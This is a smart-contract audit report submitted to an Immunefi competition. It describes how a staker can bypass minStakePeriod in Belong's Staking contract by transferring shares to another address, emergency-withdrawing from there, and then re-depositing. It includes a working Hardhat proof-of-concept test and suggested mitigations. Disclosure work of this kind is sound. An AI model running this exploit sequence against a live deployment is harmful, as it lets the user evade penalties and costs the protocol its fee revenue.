# 57850 sc medium by transferring his staking shares to another non staking address allowing him to bypass minstakeperiod&#x20;

* Submitted on Oct 29th 2025 at 08:06:33 UTC by @Oxlookman for [Audit Comp | Belong](https://immunefi.com/audit-competition/audit-comp-belong)
* Report ID: #57850
* Report Type: Smart Contract
* Report severity: Medium
* Target: <https://github.com/immunefi-team/audit-comp-belong/blob/main/contracts/v2/periphery/Staking.sol>
* Impacts:
  * Contract fails to deliver promised returns, but doesn't lose value
  * Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

### Brief / Intro

An emergency-withdrawing staker can transfer their staking shares to another address and emergency withdraw (redeem) those shares from that other address, which keeps the original staker's `stakes` mapping and timestamps intact while the actual staked assets have been removed. This allows bypassing the intended `minStakePeriod` restrictions.

### Vulnerability Details

Staker timestamps and stake shares are tracked in the `stakers` mapping:

```solidity
mapping(address staker => Stake[] times) public stakes;
```

This mapping is used to enforce `minStakePeriod` (preventing withdrawal for a period or incurring penalty). However, because staking shares are a standard ERC20 token, a staker can transfer their shares to another address before performing an emergency withdrawal. When the recipient address calls `emergencyWithdraw`, the recipient's `stakes` array may be empty, and internal helpers such as `_removeAnySharesFor` will simply return early (no adjustments to the sender's `stakes` array happen):

```solidity
for (uint256 i; i < userStakes.length && remaining > 0;) {
    uint256 stakeShares = userStakes[i].shares;
    if (stakeShares <= remaining) {
        remaining -= stakeShares;
        userStakes[i] = userStakes[userStakes.length - 1];
        userStakes.pop();
        // don't ++i: a new element is now at index i
    } else {
        userStakes[i].shares = stakeShares - remaining;
        remaining = 0;
        unchecked {
            ++i;
        }
    }
}
```

Because the original staker's `stakes` array is untouched, their timestamps remain as if the assets are still staked. If the original staker deposits the same amount again later, they can normally withdraw immediately (or without penalty) even though they have not actually respected the `minStakePeriod`.

### Impact Details

All deposited assets are intended to be withdrawable only after `minStakePeriod` or, if withdrawn earlier via emergency withdraw, to incur a penalty. This vulnerability allows bypassing `minStakePeriod`, meaning:

* The protocol can lose fee/penalty revenue.
* The intent of `minStakePeriod` (e.g., preventing MEV or protecting protocol stability) is bypassed.
* Griefing is possible: attackers can manipulate staking timestamps/state to advantage or to harm other users/ the protocol.

### Reference

* Source lines demonstrating relevant logic:\
  <https://github.com/immunefi-team/audit-comp-belong/blob/a17f775dcc4c125704ce85d4e18b744daece65af/contracts/v2/periphery/Staking.sol#L300C9-L314C10>

## Proof of Concept

Add this to the staking test file (the staking features describe test) and run on a localhost anvil node.

```javascript
it('User can withdraw normally without actually spending minStakePeriod', async () => {
  const { staking, long, admin, user1, user2 } = await loadFixture(fixture);

  const amount = ethers.utils.parseEther('1000');

  await long.connect(admin).transfer(user1.address, amount);
  await long.connect(user1).approve(staking.address, amount);
  const tx = await staking.connect(user1).mint(amount, user1.address);

  let randomWallet = ethers.Wallet.createRandom().connect(ethers.provider);
  // Transfer it some ether so that it can run transactions
  await user2.sendTransaction({to: await randomWallet.getAddress(), value: ethers.utils.parseEther('1')})
  
  const transferTx = await staking.connect(user1).transfer(randomWallet.getAddress(), amount);
  expect(transferTx).to.emit(staking, 'Transfer').withArgs(user1.address, randomWallet.getAddress(), amount);
  expect(await staking.balanceOf(user1.address)).to.eq(0);

  const txEmergency = await staking.connect(randomWallet).emergencyWithdraw(amount, user1.address, randomWallet.getAddress());
  expect(txEmergency)
    .to.emit(staking, 'EmergencyWithdraw')
    .withArgs(randomWallet.getAddress(), user1.address, randomWallet.getAddress(), amount, amount);
  await expect(txEmergency)
    .to.emit(staking, 'Withdraw')
  expect(await staking.balanceOf(user1.address)).to.eq(0);
  expect(await staking.balanceOf(randomWallet.getAddress())).to.eq(0);

  /** Allow the entire stake period to elapse plus some additional minute
  Note: that user1 is no longer staking and his amount was emergency withdrawn.
  Note: at this point user is no longer staking, but his stakes count like as he is still staking
  */
  const minStakePeriod = await staking.minStakePeriod();
  await ethers.provider.send("evm_increaseTime", [(minStakePeriod.add(5)).toNumber()]); // 1 day + 5 seconds
  await ethers.provider.send("evm_mine", []);

  // User mints new shares, and should not be able to normally withdraw before minStakePeriod has passed
  await long.connect(admin).transfer(user1.address, amount);
  await long.connect(user1).approve(staking.address, amount);
  const txSecond = await staking.connect(user1).mint(amount, user1.address);
  await expect(txSecond).to.emit(staking, 'Deposit').withArgs(user1.address, user1.address, amount, amount);
  expect(await staking.balanceOf(user1.address)).to.eq(amount);
  expect(await long.balanceOf(staking.address)).to.eq(amount);
  
  // But user can withdraw with no revert, yet he has not spent the min stakePeriod
  const withdrawTx = await staking.connect(user1).withdraw(amount, user1.address, user1.address);

  await expect(withdrawTx)
    .to.emit(staking, 'Withdraw')
    .withArgs(user1.address, user1.address, user1.address, amount, amount);
  await expect(withdrawTx).not.to.be.reverted;
});
```

### Notes

* The PoC demonstrates the sequence: deposit → transfer shares to another address → emergency withdraw from recipient → original account appears to still have staked timestamps → re-deposit and immediate (forbidden) withdraw.
* This allows bypassing minStakePeriod enforcement and penalties.

## Suggested mitigation ideas (not exhaustive)

* Tie stake accounting (timestamps & shares) to ownership of staking shares rather than to separate mappings that can be desynchronized by token transfers.
* Prevent transferability of staking shares while they are associated with active stake entries, or make emergencyWithdraw and share transfers update/clear the relevant stake entries consistently.
* Ensure any transfer of staking tokens updates the `stakes` mapping for sender and recipient to reflect the moved shares and preserves minStakePeriod semantics.
